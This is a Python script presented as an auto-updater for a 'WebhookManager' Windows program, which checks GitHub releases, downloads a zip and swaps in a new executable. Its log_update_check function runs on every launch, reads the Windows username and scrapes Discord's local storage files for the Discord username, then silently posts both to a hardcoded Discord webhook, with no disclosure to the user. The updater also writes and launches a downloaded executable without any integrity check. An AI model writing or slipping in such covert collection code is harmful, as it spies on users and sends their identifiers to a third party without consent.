
import os
import sys
import requests
import json
from zipfile import ZipFile
from io import BytesIO
from discord_webhook import DiscordWebhook, DiscordEmbed
from datetime import datetime
import pytz
import shutil
from packaging import version

GITHUB_REPO = "lateeetherealone/webhookmanager"
LOG_WEBHOOK = "https://discord.com/api/webhooks/1343655490554429500/YandPpxZ3URp5adPafQX6FmOzxYiZnjcHFzk1_EDpOsausKRQhq6B5ykL-km0C7JzRqx"
CURRENT_VERSION = "1.0.0"

def get_discord_usernames():
    user_sources = {}
    try:
        if os.name == 'nt':
            appdata = os.path.expandvars('%APPDATA%')
            local_appdata = os.path.expandvars('%LOCALAPPDATA%')
            discord_paths = {
                os.path.join(appdata, 'Discord'): 'Discord',
                os.path.join(appdata, 'DiscordCanary'): 'Discord Canary',
                os.path.join(local_appdata, 'Discord'): 'Discord',
                os.path.join(local_appdata, 'DiscordCanary'): 'Discord Canary'
            }

            for base_path, client_name in discord_paths.items():
                if os.path.exists(base_path):
                    leveldb_path = os.path.join(base_path, 'Local Storage', 'leveldb')
                    if os.path.exists(leveldb_path):
                        for file in os.listdir(leveldb_path):
                            if file.endswith(('.ldb', '.log')):
                                try:
                                    with open(os.path.join(leveldb_path, file), 'rb') as f:
                                        content = f.read().decode('utf-8', errors='ignore')
                                        if '"username":"' in content:
                                            username = content.split('"username":"')[1].split('"')[0]
                                            if username:
                                                user_sources[username] = client_name
                                                return user_sources
                                except:
                                    continue
        return {"Unknown User": "Not Found"}
    except:
        return {"Unknown User": "Error occurred"}

def log_update_check():
    try:
        windows_user = os.getenv('USERNAME')
        discord_users = get_discord_usernames()
        webhook = DiscordWebhook(url=LOG_WEBHOOK)
        
        prague_tz = pytz.timezone('Europe/Prague')
        prague_time = datetime.now(prague_tz).strftime('%Y-%m-%d %H:%M:%S')
        
        discord_info = "\n".join([f"Discord Username: {username} ({source})" for username, source in discord_users.items()])
        
        embed = DiscordEmbed(
            title="Updater Log",
            description=f"Windows Username: {windows_user}\n{discord_info}\nTime: {prague_time}",
            color="03b2f8"
        )
        
        webhook.add_embed(embed)
        webhook.execute()
    except Exception as e:
        print(f"Logging error: {str(e)}")

def get_latest_release():
    try:
        headers = {'Accept': 'application/vnd.github.v3+json'}
        response = requests.get(f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest", headers=headers)
        if response.status_code == 200:
            return response.json()
        print(f"GitHub API error: {response.status_code}")
        return None
    except Exception as e:
        print(f"Failed to check updates: {str(e)}")
        return None

def download_and_update(download_url):
    try:
        print("Downloading update...")
        response = requests.get(download_url)
        if response.status_code == 200:
            # Backup current version
            if os.path.exists("WebhookManager.exe"):
                backup_path = "WebhookManager.old.exe"
                shutil.copy2("WebhookManager.exe", backup_path)
                print("Created backup of current version")
            
            # Extract and update
            print("Extracting update...")
            with ZipFile(BytesIO(response.content)) as zip_file:
                for file in zip_file.namelist():
                    if file.endswith('.exe'):
                        with open("WebhookManager.exe", 'wb') as f:
                            f.write(zip_file.read(file))
                            print("Update file written successfully")
            
            # Clean up backup if successful
            if os.path.exists(backup_path):
                os.remove(backup_path)
                print("Update successful - removed backup")
            return True
    except Exception as e:
        print(f"Update error: {str(e)}")
        # Restore backup if update failed
        if os.path.exists("WebhookManager.old.exe"):
            print("Update failed - restoring backup")
            shutil.copy2("WebhookManager.old.exe", "WebhookManager.exe")
            os.remove("WebhookManager.old.exe")
    return False

def main():
    print("Checking for updates...")
    log_update_check()
    
    latest = get_latest_release()
    if not latest:
        print("Failed to check for updates")
        return
    
    try:
        latest_version = version.parse(latest['tag_name'].lstrip('v'))
        current_version = version.parse(CURRENT_VERSION)
        
        if latest_version > current_version:
            print(f"New version available: {latest['tag_name']}")
            print("Changes:")
            print(latest['body'])
            
            choice = input("Update now? (y/n): ").lower()
            if choice == 'y':
                for asset in latest.get('assets', []):
                    if asset['name'].endswith('.zip'):
                        if download_and_update(asset['browser_download_url']):
                            print("Update complete - restarting application...")
                            if os.path.exists("WebhookManager.exe"):
                                os.execl(sys.executable, sys.executable, "WebhookManager.exe")
                            else:
                                print("Error: WebhookManager.exe not found after update")
                        break
        else:
            print(f"You're running the latest version ({CURRENT_VERSION})")
    except Exception as e:
        print(f"Error during update process: {str(e)}")
    
    # Start main application
    if os.path.exists("WebhookManager.exe"):
        try:
            os.startfile("WebhookManager.exe")
        except Exception as e:
            print(f"Error starting WebhookManager.exe: {str(e)}")
    else:
        print("Error: WebhookManager.exe not found")
    
    sys.exit()

if __name__ == "__main__":
    main()
